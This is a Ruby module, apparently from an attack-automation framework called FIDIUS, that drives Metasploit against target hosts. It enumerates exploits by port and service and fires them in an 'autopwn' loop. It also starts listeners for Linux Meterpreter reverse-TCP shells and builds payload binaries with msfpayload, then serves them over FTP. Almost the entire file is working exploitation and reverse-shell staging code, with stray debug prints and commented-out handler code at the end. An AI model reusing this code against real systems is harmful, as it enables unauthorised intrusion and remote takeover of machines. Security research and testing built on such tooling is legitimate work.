require "fidius/action/exploit/autopwner"

module FIDIUS
  module Action
    module Exploit
      # This class contains a autopwner, which can be run against host.
      # This is a singleton, so do not create a own instance of this object.
      class Exploit
        include Singleton

        def initialize
          FIDIUS::Action::Msf.instance.daemon.load_plugin "multihandler_manager"
          @framework = FIDIUS::Action::Msf.instance.framework
          @found_ports, @found_services = get_exploits_by_ports
          start_ftp
        end

        # Runs the autopwner against the given interface object.
        # If wait_after_exploit or wait_after_payload is set, 
        # the autopwner runs all exploits with all
        # combination of payloads against the given interface object.
        #
        # @param [Interface]  The interface to exploit.
        # @param [String]  The IP address the payload should reverse connect to.
        # @param [Integer]  The port the payload should reverse connect to.
        # @param [String] Time in seconds to wait between running an exploit.
        # @param [String] Time in seconds to wait between a used payload per exploit.
        # @return [Msf::Session] A Session got for this exploit.
        def autopwn rhost, lhost = nil, lport = nil, wait_after_exploit = nil, wait_after_payload = nil
          lhost = get_lhost rhost.ip unless lhost
          autopwner = FIDIUS::Action::Exploit::Autopwner.new rhost, lhost, lport
          handler = start_handler_if_necessary_for_rhost rhost, 4445
          generate_downloadable_payload_for_handler handler
          if wait_after_exploit or wait_after_payload
            autopwner.run_autopwn @found_ports, @found_services, wait_after_exploit, wait_after_payload
          else
            autopwner.run_autopwn @found_ports, @found_services
          end
          stop_handler
        end

        def self.exploit_interface_with_picked_exploit(interface_id, exploit_id)
          i = FIDIUS::Asset::Interface.find(interface_id)
          exploit = FIDIUS::EvasionDB::Knowledge::AttackModule.find(exploit_id)
          autopwner = FIDIUS::Action::Exploit::Autopwner.new i
          s = autopwner.run_exploit_against_host_at_port exploit.name, nil, nil
          if s.class.name == "FIDIUS::Session"
            true
          else
            false
          end
        end

        private

        def get_lhost rhost
          result = nil
          sb = FIDIUS::Action::Msf.instance.get_switch_board
          sb.each do |route|
            route.comm.net.config.each_route do |ipaddr|
              next if ipaddr.subnet =~ /^(224\.|127\.)/
              next if ipaddr.subnet == '0.0.0.0'
              next if ipaddr.netmask == '255.255.255.255'
              if (IPAddr.new "#{ipaddr.subnet}/#{ipaddr.netmask}").include? IPAddr.new rhost
                result = ipaddr.gateway
                break
              end
            end
          end
          return result
        end

        # Finds all exploits and auxiliaries and orders them by port or
        # service.
        #
        # @return [Array] Two lists of
        def get_exploits_by_ports
          mod_by_port = {}
          mod_by_service = {}
          @framework.exploits.each_module do |modname, mod|
            o = FIDIUS::Action::Msf.instance.module_create(modname)
            if(o.datastore['RPORT'])
              rport = o.datastore['RPORT']
              mod_by_port[rport.to_i] ||= {}
              mod_by_port[rport.to_i][o.fullname] = {:disclosure => o.disclosure_date, :platform => o.platform_to_s}
            end
            if(o.respond_to?('autofilter_services'))
              o.autofilter_services.each do |serv|
                mod_by_service[serv] ||= {}
                mod_by_service[serv][o.fullname] = {:disclosure => o.disclosure_date, :platform => o.platform_to_s}
              end
            end
          end
          [mod_by_port, mod_by_service]
        end
        # Starts a Payload-Handler if necessary
        # @param [Interface]  The interface to exploit.
        # @param [Integer]  Port to listen on.
        #
        # @return [Hash] Options used for the Handler
        def start_handler_if_necessary_for_rhost rhost, port=4445
          return if rhost.host.os_name && rhost.host.os_name.downcase == "windows"
          interface = FIDIUS::Common.get_my_ip(rhost.ip) ? rhost : '0.0.0.0'
          p "START HANDLER ON INTERFACE WITH IP: #{interface.ip}"
          running_handler = @framework.get_running_multihandler
          p "Running Handler: #{running_handler}"
          running_handler.each {|handler|
            return handler if handler[:payload] == 'linux/x86/meterpreter/reverse_tcp' and handler[:lhost] == interface.ip
            port +=1 if handler[:lport] == port
          }
          opts = {}
          opts['LHOST'] = interface.ip
          opts['PAYLOAD'] = 'linux/x86/meterpreter/reverse_tcp'
          opts['LPORT'] = port
          thread = @framework.start_multihandler opts rescue puts("RESCUED IN START HANDLER")
          thread.join
          p "HANDLER: #{@framework.get_running_multihandler}"
          @framework.get_running_multihandler.last
        end

        def stop_handler
          @framework.get_running_multihandler.each {|handler|
              @framework.stop_multihandler handler[:jid]
            }
        end

        #TODO
        def generate_downloadable_payload_for_handler handler
          return unless handler
          dir_for_payload = "#{BASE}/../bin/payloads"
          ip = FIDIUS::Common.get_my_ip(handler[:lhost])
          puts "WTF HAAAAAAAAAAAA #{dir_for_payload}"
          unless Dir.exists? (dir_for_payload)
            Dir.mkdir(dir_for_payload)
          end
          path = "#{dir_for_payload}/#{handler[:payload].gsub('/','_')}"
          File.delete(path) if File.exists? path
          p "#{FIDIUS.config['metasploit']['path']}/msfpayload #{handler[:payload]} LHOST=#{ip} LPORT=#{handler[:lport]} X > #{path}"
          system "ruby #{FIDIUS.config['metasploit']['path']}/msfpayload #{handler[:payload]} LHOST=#{ip} LPORT=#{handler[:lport]} X > #{path}"
        end

        def start_ftp port=13000
          p "STARTING FTP SERVER #{port}"
          dir_for_payload = "#{BASE}/../bin/payloads"
          opts = {}
          opts['FTPROOT'] = "#{dir_for_payload}"
          #opts['SRVHOST'] =
          opts['SRVPORT'] = port
          FIDIUS::Action::Msf.instance.run_auxiliary("auxiliary/server/ftp", opts, true)
          p "DONE STARTING FTP SERVER #{port}"
        end

      end # class Exploit
    end # module Exploit
  end # module Action
end # module FIDIUS
          # opts = {}
          # opts['LHOST'] = FIDIUS::Common.get_my_ip rhost.ip
          # opts['PAYLOAD'] = 'linux/x86/meterpreter/reverse_tcp'
          # opts['LPORT'] = 4443
          # FIDIUS::Action::Msf.instance.run_exploit("multi/handler", opts, true)

